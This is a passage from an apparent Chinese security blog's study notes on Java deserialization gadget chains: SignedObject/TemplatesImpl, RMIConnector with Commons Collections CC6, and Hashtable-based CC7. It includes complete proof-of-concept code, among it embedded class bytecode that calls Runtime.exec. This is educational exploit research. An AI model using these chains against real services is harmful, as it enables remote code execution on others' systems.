class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table1</span> <span class="operator">=</span> getPayload(Templates.class, impl);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table2</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(table2);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getPayload</span> <span class="params">(Class clazz, Object payloadObj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, payloadObj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, payloadObj);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_beanClass&quot;</span>, clazz);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_obj&quot;</span>, payloadObj);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细调试调用里面的时候真觉得好nb的,也用到了之后讲的c7如何用invoke控制输入的问题吧</p>
<h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p>位于javax.management.remote.rmi包下，⽤于与rmi连接器连接的类</p>
<p>RMIConnector.findRMIServerJRMP⽅法中，存在⼀处反序列化操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="type">boolean</span> isIiop)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] serialized;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serialized = base64ToByteArray(base64);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span></span><br><span class="line">            (loader == <span class="literal">null</span>) ?</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin) :</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ObjectInputStreamWithLoader</span>(bin, loader);</span><br><span class="line">    <span class="keyword">final</span> Object stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = oin.readObject();</span><br></pre></td></tr></table></figure>

<p>⼤体逻辑就是对⼀个base64密⽂字符串解密后进⾏反序列化</p>
<p>ObjectInputStreamWithLoader类重写了resovleClass⽅法，跟原⽣resovleClass⽅法没有太⼤差别，不影响调⽤</p>
<p>但由于这个⽅法被private修饰，不能从外部访问，全局寻找这个⽅法，只有⼀处调⽤了findRMIServerJRMP⽅法，位于</p>
<p>findRMIServer⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> directoryURL.getURLPath();</span><br><span class="line"><span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> path.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line"><span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/jndi/&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/stub/&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br></pre></td></tr></table></figure>

<p>也就是我们要构造⼀个 &#x2F;stub&#x2F;base64 的path </p>
<p>这里path是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> directoryURL.getURLPath();</span><br></pre></td></tr></table></figure>

<p>而directoryURL是传入的JMXServiceURL类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span><br><span class="line"><span class="params">           Map&lt;String, Object&gt; environment)</span></span><br></pre></td></tr></table></figure>

<p>而JMXServiceURL的构造方法是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JMXServiceURL</span><span class="params">(String protocol, String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                     String urlPath)</span></span><br></pre></td></tr></table></figure>

<p>这个urlpath就是我们可控的</p>
<p>继续找哪里调用了这个方法，发现在connect中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(Map&lt;String,?&gt; environment)</span></span><br><span class="line"><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">tracing</span> <span class="operator">=</span> logger.traceOn();</span><br><span class="line">    <span class="type">String</span>        <span class="variable">idstr</span>   <span class="operator">=</span> (tracing?<span class="string">&quot;[&quot;</span>+<span class="built_in">this</span>.toString()+<span class="string">&quot;]&quot;</span>:<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (terminated) &#123;</span><br><span class="line">        logger.trace(<span class="string">&quot;connect&quot;</span>,idstr + <span class="string">&quot; already closed.&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Connector closed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (connected) &#123;</span><br><span class="line">        logger.trace(<span class="string">&quot;connect&quot;</span>,idstr + <span class="string">&quot; already connected.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tracing) logger.trace(<span class="string">&quot;connect&quot;</span>,idstr + <span class="string">&quot; connecting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map&lt;String, Object&gt; usemap =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;((<span class="built_in">this</span>.env==<span class="literal">null</span>) ?</span><br><span class="line">                    Collections.&lt;String, Object&gt;emptyMap() : <span class="built_in">this</span>.env);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (environment != <span class="literal">null</span>) &#123;</span><br><span class="line">            EnvHelp.checkAttributes(environment);</span><br><span class="line">            usemap.putAll(environment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get RMIServer stub from directory or URL encoding if needed.</span></span><br><span class="line">        <span class="keyword">if</span> (tracing) logger.trace(<span class="string">&quot;connect&quot;</span>,idstr + <span class="string">&quot; finding stub...&quot;</span>);</span><br><span class="line">        <span class="type">RMIServer</span> <span class="variable">stub</span> <span class="operator">=</span> (rmiServer!=<span class="literal">null</span>)?rmiServer:</span><br><span class="line">            findRMIServer(jmxServiceURL, usemap);</span><br></pre></td></tr></table></figure>

<p>这里要求rmiserver为null就能调用了</p>
<p>来看看构造方法发现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">RMIConnector</span><span class="params">(RMIServer rmiServer, JMXServiceURL address,</span></span><br><span class="line"><span class="params">        Map&lt;String, ?&gt; environment)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (rmiServer == <span class="literal">null</span> &amp;&amp; address == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span></span><br><span class="line">            <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;rmiServer and jmxServiceURL both null&quot;</span>);</span><br><span class="line">    initTransients();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.rmiServer = rmiServer;</span><br><span class="line">    <span class="built_in">this</span>.jmxServiceURL = address;</span><br><span class="line">    <span class="keyword">if</span> (environment == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.env = Collections.emptyMap();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        EnvHelp.checkAttributes(environment);</span><br><span class="line">        <span class="built_in">this</span>.env = Collections.unmodifiableMap(environment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RMIConnector</span><span class="params">(JMXServiceURL url, Map&lt;String,?&gt; environment)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="literal">null</span>, url, environment);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RMIConnector</span><span class="params">(RMIServer rmiServer, Map&lt;String,?&gt; environment)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(rmiServer, <span class="literal">null</span>, environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造的话我们还是只能用第三个了,不然会扔错,返回反射改jmxServiceURL的值就行了</p>
<p>就是想办法调用connect方法了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64string&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>利用cc链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,chainedTransformer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> serializeBase64(hashMap1);</span><br><span class="line">        run(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String base64)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+base64);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">connect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,rmiConnector);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,connect);</span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(hashMap1);</span><br><span class="line">        unserialize(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialize Ok!&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serializeBase64</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] ser)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Unserialize Ok!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><p>就是之前hex了</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链7</title>
    <url>/2023/07/18/cc7/</url>
    <content><![CDATA[<p>CC7 依旧是寻找 LazyMap 的触发点，这次用到了 Hashtable。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h3><p>Hashtable 与 HashMap 十分相似，是一种 key-value 形式的哈希表，但仍然存在一些区别：</p>
<ul>
<li>HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary ，可以说是一个过时的类。</li>
<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
<li>Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key&#x3D;null 的实体放在 index&#x3D;0 的位置。</li>
<li>Hashtable 线程安全，HashMap 线程不安全。</li>
</ul>
<p>那既然两者如此相似，Hashtable 的内部逻辑能否触发反序列化漏洞呢？答案是肯定的。</p>
<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><h5 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h5><p>Hashtable 的 readObject 方法中，最后调用了 <code>reconstitutionPut</code> 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>reconstitutionPut</code> 调用了 key 的 hashCode 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();<span class="comment">//</span></span><br><span class="line">....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>学过之前的算简单了,没像PriorityQueue那样多套几层</p>
<p>同样的需要注意条件,在put的时候也会使用使用hashcode函数</p>
<p>所以用 Hashtable 跟 HashMap 触发 LazyMap 方式差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="comment">// Make sure the value is not null</span></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();<span class="comment">//这里会调用hashcode</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">...       </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h5 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h5><p>但是在ysoserial中利用点不是这个,通过AbstractMap#equals来触发对LazyMap#get方法的调用,而且AbstractMap是一个抽象类,hashmap是它的子类并且没有重写equals方法</p>
